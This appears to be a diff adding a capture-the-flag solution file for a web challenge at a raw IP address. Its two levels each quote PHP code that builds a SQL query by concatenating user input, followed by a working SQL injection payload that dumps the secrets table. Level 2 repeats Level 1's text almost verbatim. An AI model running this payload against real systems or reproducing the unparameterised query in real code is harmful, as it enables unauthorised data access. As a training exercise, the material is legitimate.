@@ -1,1 +1,33 @@
 http://34.66.235.224:12000/
+
+###############################################################################
+Level 1
+###############################################################################
+Explanation:-------------------------------------------------------------------
+  This is classic SQL injection where you can directly manipulate the query
+  through the text entry field. Prepared statements are not used.
+
+  Vulnerable code:
+    if (isset($_POST['session_id'])) {
+        $query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";
+        $result = $conn->query($query);
+    }
+
+Solution:----------------------------------------------------------------------
+  ' OR session_id LIKE "%a%
+
+###############################################################################
+Level 2
+###############################################################################
+Explanation:
+  This is classic SQL injection where you can directly manipulate the query
+  through the text entry field. Prepared statements are not used.
+
+  Vulnerable code:
+    if (isset($_POST['session_id'])) {
+        $query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";
+        $result = $conn->query($query);
+    }
+
+Solution:
+  ' OR session_id LIKE "%a%
